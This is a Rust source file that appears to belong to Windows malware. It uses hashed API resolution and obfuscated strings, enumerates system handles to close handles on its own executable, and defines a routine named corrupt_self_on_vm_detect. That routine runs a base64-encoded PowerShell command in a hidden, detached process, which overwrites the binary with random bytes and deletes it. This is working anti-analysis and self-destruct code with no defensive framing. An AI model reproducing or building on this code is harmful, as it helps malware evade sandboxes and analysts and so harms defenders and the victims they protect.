use crate::sprotect;
use std::ptr::null_mut;
use std::mem::size_of;

#[repr(C)]
struct SystemHandleTableEntryInfo {
    unique_process_id: u16,
    creator_back_trace_index: u16,
    object_type_index: u8,
    handle_attributes: u8,
    handle_value: u16,
    object: *mut std::ffi::c_void,
    granted_access: u32,
}

#[repr(C)]
struct SystemHandleInformation {
    number_of_handles: u32,
    handles: [SystemHandleTableEntryInfo; 1],
}

type NtQuerySystemInformationFn = unsafe extern "system" fn(
    u32,
    *mut std::ffi::c_void,
    u32,
    *mut u32,
) -> i32;

const SYSTEM_HANDLE_INFORMATION: u32 = 16;
const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC0000004u32 as i32;

fn get_current_exe_path() -> Option<String> {
    use crate::api_resolve::HashedAPIs;
    
    let mut buffer = vec![0u16; 32768];
    unsafe {
        let len = HashedAPIs::get_module_file_name_w(null_mut(), buffer.as_mut_ptr(), buffer.len() as u32);
        if len > 0 {
            buffer.truncate(len as usize);
            return Some(String::from_utf16_lossy(&buffer));
        }
    }
    None
}

fn close_exe_handles() -> bool {
    use crate::api_resolve::HashedAPIs;
    unsafe {
        let ntdll_name: Vec<u16> = sprotect!("ntdll.dll").encode_utf16().chain(std::iter::once(0)).collect();
        let ntdll = HashedAPIs::get_module_handle_w(ntdll_name.as_ptr());
        
        if ntdll.is_null() {
            return false;
        }

        let nt_query_fn = match HashedAPIs::get_proc_address(
            ntdll,
            b"NtQuerySystemInformation\0".as_ptr() as *const i8
        ) {
            func if func.is_null() => return false,
            func => std::mem::transmute::<_, NtQuerySystemInformationFn>(func),
        };

        let exe_path = match get_current_exe_path() {
            Some(p) => p.to_uppercase().replace("\\\\?\\", ""),
            None => return false,
        };

        let current_pid = HashedAPIs::get_current_process_id() as u16;

        let mut buffer_size: u32 = 0x10000;
        let mut buffer: Vec<u8> = vec![0; buffer_size as usize];
        let mut return_length: u32 = 0;

        loop {
            let status = nt_query_fn(
                SYSTEM_HANDLE_INFORMATION,
                buffer.as_mut_ptr() as *mut _,
                buffer_size,
                &mut return_length,
            );

            if status == STATUS_INFO_LENGTH_MISMATCH {
                buffer_size = return_length + 0x1000;
                buffer.resize(buffer_size as usize, 0);
                continue;
            }

            if status != 0 {
                return false;
            }

            break;
        }

        let handle_info = &*(buffer.as_ptr() as *const SystemHandleInformation);
        let handles_ptr = &handle_info.handles as *const SystemHandleTableEntryInfo;

        for i in 0..handle_info.number_of_handles {
            let handle_entry = &*handles_ptr.offset(i as isize);

            if handle_entry.unique_process_id != current_pid {
                continue;
            }

            if handle_entry.object_type_index != 28 {
                continue;
            }

            let handle = handle_entry.handle_value as usize as winapi::um::winnt::HANDLE;

            let mut file_path = vec![0u16; 32768];
            let path_len = HashedAPIs::get_final_path_name_by_handle_w(
                handle as *mut std::ffi::c_void,
                file_path.as_mut_ptr(),
                file_path.len() as u32,
                0,
            );

            if path_len > 0 {
                file_path.truncate(path_len as usize);
                let path_str = String::from_utf16_lossy(&file_path).to_uppercase().replace("\\\\?\\", "");

                if path_str == exe_path || exe_path.ends_with(&path_str) || path_str.ends_with(&exe_path) {
                    HashedAPIs::close_handle(handle as *mut std::ffi::c_void);
                    std::thread::sleep(std::time::Duration::from_millis(100));
                    return true;
                }
            }
        }
    }

    false
}

pub fn corrupt_self_on_vm_detect() {
    let exe_path = match get_current_exe_path() {
        Some(p) => p,
        None => return,
    };

    let ps_script = format!(
        r#"Start-Sleep -Seconds 2; $bytes = [byte[]](1..8192 | ForEach-Object {{ Get-Random -Minimum 0 -Maximum 256 }}); [System.IO.File]::WriteAllBytes('{}', $bytes); Remove-Item -Path '{}' -Force"#,
        exe_path.replace("'", "''"),
        exe_path.replace("'", "''")
    );

    let encoded_cmd = {
        let utf16: Vec<u16> = ps_script.encode_utf16().collect();
        let bytes: Vec<u8> = utf16.iter().flat_map(|&x| vec![(x & 0xFF) as u8, (x >> 8) as u8]).collect();
        base64::encode(&bytes)
    };

    unsafe {
        use crate::api_resolve::HashedAPIs;
        use winapi::um::winbase::{CREATE_NO_WINDOW, DETACHED_PROCESS, CREATE_NEW_PROCESS_GROUP};
        use std::ptr::null_mut;

        let cmd = format!("powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {}", encoded_cmd);
        let mut cmd_wide: Vec<u16> = cmd.encode_utf16().chain(std::iter::once(0)).collect();

        let mut si: winapi::um::processthreadsapi::STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<winapi::um::processthreadsapi::STARTUPINFOW>() as u32;
        si.dwFlags = 0x00000001;
        si.wShowWindow = 0;

        let mut pi: winapi::um::processthreadsapi::PROCESS_INFORMATION = std::mem::zeroed();

        HashedAPIs::create_process_w(
            null_mut(),
            cmd_wide.as_mut_ptr(),
            null_mut(),
            null_mut(),
            0,
            CREATE_NO_WINDOW | DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
            null_mut(),
            null_mut(),
            &mut si as *mut _ as *mut std::ffi::c_void,
            &mut pi as *mut _ as *mut std::ffi::c_void,
        );

        if !pi.hProcess.is_null() {
            HashedAPIs::close_handle(pi.hProcess as *mut _);
        }
        if !pi.hThread.is_null() {
            HashedAPIs::close_handle(pi.hThread as *mut _);
        }
    }
}
